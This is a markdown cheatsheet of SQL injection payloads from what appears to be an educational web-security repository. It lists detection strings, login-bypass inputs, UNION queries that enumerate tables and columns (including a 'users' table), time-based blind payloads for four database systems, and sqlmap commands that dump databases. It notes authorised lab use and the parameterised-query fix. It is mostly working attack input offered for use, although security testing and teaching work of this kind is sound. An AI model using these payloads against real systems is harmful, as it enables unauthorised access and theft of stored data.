<!-- SPDX-License-Identifier: GPL-3.0-or-later | Copyright (C) 2026 Nithees Narendra S -->
[Home](../README.md) › [Cheatsheets](README.md) › **SQL Injection Payload Cheatsheet**

# SQL Injection Payload Cheatsheet

> Per-DBMS syntax, detection strings and extraction techniques. Printable: use your browser's *Print → Save as PDF*.

_Domain: Web Security · Last updated 2026-08-13_

## Quick reference

This cheatsheet is a fast recall aid, not a tutorial — learn the concepts in the Manual, then keep this beside you while you work.

> For **authorised** testing against your own labs (bWAPP/DVWA/Juice Shop) only.

## Detection
`'`  ·  `"`  ·  `')`  ·  `';`  ·  `' OR '1'='1`  ·  `" OR ""="`  ·  `1) OR (1=1`

## Auth bypass
```
admin'--
admin'#
' OR 1=1-- -
' OR 'x'='x'-- -
") OR ("1"="1
```

## UNION-based
```
' ORDER BY 5-- -                     # find column count
' UNION SELECT NULL,NULL,NULL-- -    # match columns
' UNION SELECT 1,@@version,3-- -     # reflect a value
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
```

## Blind — boolean & time
| DBMS | Time payload |
| --- | --- |
| MySQL | `' AND SLEEP(5)-- -` / `' OR IF(1=1,SLEEP(5),0)-- -` |
| PostgreSQL | `'; SELECT pg_sleep(5)-- -` |
| MSSQL | `'; WAITFOR DELAY '0:0:5'-- -` |
| Oracle | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -` |

## Useful strings by DBMS
| | Version | Current DB/user |
| --- | --- | --- |
| MySQL | `@@version` | `database()` / `current_user()` |
| PostgreSQL | `version()` | `current_database()` / `current_user` |
| MSSQL | `@@version` | `DB_NAME()` / `SYSTEM_USER` |

## Automation
```bash
sqlmap -u 'http://TARGET/item?id=1' --batch --dbs
sqlmap -u 'http://TARGET/item?id=1' --batch -D db -T users --dump
sqlmap -r request.txt --batch --level 5 --risk 3
```
**Fix:** parameterised queries. Everything above fails against bound parameters.

## Related

- [All cheatsheets](README.md)
- [Tools reference](../reference/tools/README.md)
- [Repository home](../README.md)

